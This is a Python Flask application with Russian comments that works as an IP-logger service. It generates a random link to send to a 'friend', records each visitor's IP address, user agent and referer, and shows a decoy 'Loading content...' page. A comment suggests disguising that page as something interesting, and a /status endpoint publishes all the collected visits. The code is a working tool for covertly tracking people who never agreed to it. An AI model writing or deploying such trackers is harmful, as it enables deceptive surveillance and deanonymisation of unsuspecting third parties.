#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Скрипт для отслеживания IP-адресов через случайные ссылки
Адаптирован для Render
"""

import random
import string
import os
from flask import Flask, request, jsonify
from datetime import datetime

app = Flask(__name__)

# Хранилище для отслеживания посещений
visits = {}

def generate_random_link(length=20):
    """Генерирует случайную строку для ссылки"""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# Генерируем случайную ссылку при запуске
tracking_code = generate_random_link()

@app.route('/')
def index():
    """Главная страница с информацией"""
    base_url = request.host_url.rstrip('/')
    tracking_url = f"{base_url}/track/{tracking_code}"
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>IP Tracker</title>
        <meta charset="utf-8">
        <style>
            body {{
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                margin: 0;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 20px;
            }}
            .container {{
                text-align: center;
                padding: 40px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 20px;
                backdrop-filter: blur(10px);
                max-width: 600px;
            }}
            h1 {{ font-size: 2.5em; margin-bottom: 20px; }}
            .link-box {{
                background: rgba(255, 255, 255, 0.2);
                padding: 20px;
                border-radius: 10px;
                margin: 20px 0;
                word-break: break-all;
            }}
            .link {{
                font-size: 1.2em;
                color: #fff;
                text-decoration: none;
            }}
            .code {{
                font-family: monospace;
                background: rgba(0, 0, 0, 0.3);
                padding: 10px;
                border-radius: 5px;
                margin: 10px 0;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎯 IP Tracker</h1>
            <p>Случайная ссылка для отслеживания:</p>
            <div class="link-box">
                <a href="{tracking_url}" class="link" target="_blank">{tracking_url}</a>
            </div>
            <div class="code">
                Код: {tracking_code}
            </div>
            <p>Отправьте эту ссылку другу для отслеживания IP-адреса</p>
            <p><a href="/status" style="color: #fff;">📊 Статус посещений</a></p>
        </div>
    </body>
    </html>
    '''

@app.route('/track/<code>')
def track(code):
    """Обработчик для отслеживания посещений"""
    # Получаем IP-адрес
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers.get('X-Real-IP')
    else:
        ip = request.remote_addr
    
    # Получаем дополнительную информацию
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    referer = request.headers.get('Referer', 'Direct')
    
    # Сохраняем информацию о посещении
    visit_info = {
        'ip': ip,
        'timestamp': timestamp,
        'user_agent': user_agent,
        'code': code,
        'referer': referer
    }
    
    visits[code] = visit_info
    
    # Выводим информацию в консоль (логи Render)
    print("\n" + "="*60)
    print("🔍 ОБНАРУЖЕНО ПОСЕЩЕНИЕ!")
    print("="*60)
    print(f"📅 Время: {timestamp}")
    print(f"🌐 IP-адрес: {ip}")
    print(f"🔗 Код ссылки: {code}")
    print(f"💻 Браузер: {user_agent}")
    print(f"🔗 Referer: {referer}")
    print("="*60 + "\n")
    
    # Возвращаем простую страницу (можно замаскировать под что-то интересное)
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Загрузка...</title>
        <meta charset="utf-8">
        <style>
            body {
                font-family: Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
            }
            .container {
                text-align: center;
                padding: 40px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 20px;
                backdrop-filter: blur(10px);
            }
            h1 { font-size: 2.5em; margin-bottom: 20px; }
            .loader {
                border: 4px solid rgba(255, 255, 255, 0.3);
                border-top: 4px solid white;
                border-radius: 50%;
                width: 50px;
                height: 50px;
                animation: spin 1s linear infinite;
                margin: 20px auto;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Загрузка контента...</h1>
            <div class="loader"></div>
            <p>Пожалуйста, подождите</p>
        </div>
    </body>
    </html>
    '''

@app.route('/status')
def status():
    """Проверка статуса и получение всех посещений"""
    base_url = request.host_url.rstrip('/')
    tracking_url = f"{base_url}/track/{tracking_code}"
    
    return jsonify({
        'tracking_code': tracking_code,
        'tracking_url': tracking_url,
        'visits': visits,
        'total_visits': len(visits)
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("\n" + "="*60)
    print("🎯 ТРЕКЕР IP-АДРЕСОВ ЗАПУЩЕН!")
    print("="*60)
    print(f"🔗 Код отслеживания: {tracking_code}")
    print(f"🌐 Сервер запущен на порту: {port}")
    print("="*60 + "\n")
    app.run(host='0.0.0.0', port=port, debug=False)

